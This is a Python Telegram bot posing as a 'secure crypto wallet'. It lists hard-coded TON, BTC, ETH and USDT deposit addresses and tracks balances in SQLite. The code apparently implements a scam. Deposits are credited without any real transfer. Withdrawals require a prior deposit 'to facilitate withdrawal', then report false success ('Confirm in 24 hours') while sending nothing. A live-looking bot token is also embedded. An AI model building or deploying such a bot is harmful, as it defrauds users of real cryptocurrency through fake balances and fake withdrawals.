import asyncio
import logging
import aiohttp
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

BOT_TOKEN = "7988757416:AAE6ApzjE7WvMRxKp3W5ZpH8rsyrrfv71Yg"
ADMIN_ID = 7988595664
TON_DEPOSIT_ADDRESS = "UQDbWG-rt9WPhx_lWhlUYSezvBcXDvGiyagj72rnTGocUHwj"
MIN_WITHDRAW_TON = 5
DB_PATH = "users.db"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

coin_info = {
    "TON": {"emoji": "💎", "image": "https://cryptologos.cc/logos/toncoin-ton-logo.png", "id": "the-open-network", "deposit": TON_DEPOSIT_ADDRESS},
    "BTC": {"emoji": "₿", "image": "https://cryptologos.cc/logos/bitcoin-btc-logo.png", "id": "bitcoin", "deposit": "bc1qfcgp3a7uamnyyc4j79x6n5lej7q2zn4zgvlsml"},
    "ETH": {"emoji": "Ξ", "image": "https://cryptologos.cc/logos/ethereum-eth-logo.png", "id": "ethereum", "deposit": "0x546E7e50fD96Afd4dAA4b25Ffa9910dcA1dE9d02"},
    "USDT": {"emoji": "💵", "image": "https://cryptologos.cc/logos/tether-usdt-logo.png", "id": "tether", "deposit": "0x546E7e50fD96Afd4dAA4b25Ffa9910dcA1dE9d02"}
}

main_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="💎 TON"), KeyboardButton(text="₿ BTC")],
        [KeyboardButton(text="Ξ ETH"), KeyboardButton(text="💵 USDT")],
        [KeyboardButton(text="ℹ️ Help")]
    ],
    resize_keyboard=True
)

async def get_prices():
    ids = ",".join([coin_info[c]["id"] for c in coin_info])
    url = f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            return await resp.json()

async def get_user_balance(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, deposited REAL DEFAULT 0)")
        cursor = await db.execute("SELECT balance, deposited FROM users WHERE user_id = ?", (user_id,))
        result = await cursor.fetchone()
        if result:
            return result
        else:
            await db.execute("INSERT INTO users (user_id, balance, deposited) VALUES (?, 0, 0)", (user_id,))
            await db.commit()
            return (0.0, 0.0)

async def update_user_balance(user_id, new_balance, new_deposit=None):
    async with aiosqlite.connect(DB_PATH) as db:
        if new_deposit is not None:
            await db.execute("UPDATE users SET balance = ?, deposited = ? WHERE user_id = ?", (new_balance, new_deposit, user_id))
        else:
            await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_balance, user_id))
        await db.commit()

@dp.message()
async def handle_message(message: types.Message):
    text = message.text.strip()
    user_id = message.from_user.id

    if text == "ℹ️ Help":
        help_text = "Welcome to your secure crypto wallet.\n\n- Deposit TON to: <code>{}</code>\n- You must deposit at least {} TON to facilitate withdrawal.\n\nBTC: {}\nETH: {}\nUSDT (ERC20): {}".format(
            TON_DEPOSIT_ADDRESS, MIN_WITHDRAW_TON,
            coin_info['BTC']['deposit'],
            coin_info['ETH']['deposit'],
            coin_info['USDT']['deposit']
        )
        await message.answer(help_text, parse_mode=ParseMode.HTML)
        return

    stripped_text = text.replace("💎","").replace("₿","").replace("Ξ","").replace("💵","").strip().upper()
    if stripped_text in coin_info:
        data = await get_prices()
        balance, deposited = await get_user_balance(user_id) if stripped_text == "TON" else (0.0, 0.0)
        price = data.get(coin_info[stripped_text]["id"], {}).get("usd", 0)
        usd_value = balance * price
        caption = f"{coin_info[stripped_text]['emoji']} <b>{stripped_text} Wallet</b>\nBalance: {balance:.4f} {stripped_text}\nMarket Value: ${usd_value:.2f}"
        coin_keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="Deposit"), KeyboardButton(text="Withdraw")],[KeyboardButton(text="Back")]],
            resize_keyboard=True
        )
        await bot.send_photo(message.chat.id, coin_info[stripped_text]["image"], caption=caption, reply_markup=coin_keyboard)

    elif text.lower() == "deposit":
        balance, deposited = await get_user_balance(user_id)
        new_deposit = deposited + 5
        new_balance = balance + 5
        await update_user_balance(user_id, new_balance, new_deposit)
        await message.answer(f"Deposit successful! Your new balance: {new_balance} TON. Total deposited: {new_deposit} TON.")
    elif text.lower() == "withdraw":
        balance, deposited = await get_user_balance(user_id)
        if deposited < MIN_WITHDRAW_TON:
            await message.answer(f"❌ You must have a minimum deposit of {MIN_WITHDRAW_TON} TON to facilitate withdrawal. Total deposited: {deposited:.2f} TON.")
        elif balance >= MIN_WITHDRAW_TON:
            new_balance = balance - MIN_WITHDRAW_TON
            await update_user_balance(user_id, new_balance, deposited)
            await message.answer("✅ Successful withdrawal! Confirm in 24 hours.")
            await bot.send_message(ADMIN_ID, f"User {user_id} withdrew {MIN_WITHDRAW_TON} TON. New balance: {new_balance:.4f} TON.")
        else:
            await message.answer(f"❌ Insufficient balance. You need at least {MIN_WITHDRAW_TON} TON to withdraw. Your balance: {balance:.2f} TON.")
    elif text.lower() == "back":
        await message.answer("Choose a coin:", reply_markup=main_keyboard)
    else:
        await message.answer("Use the menu buttons.", reply_markup=main_keyboard)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
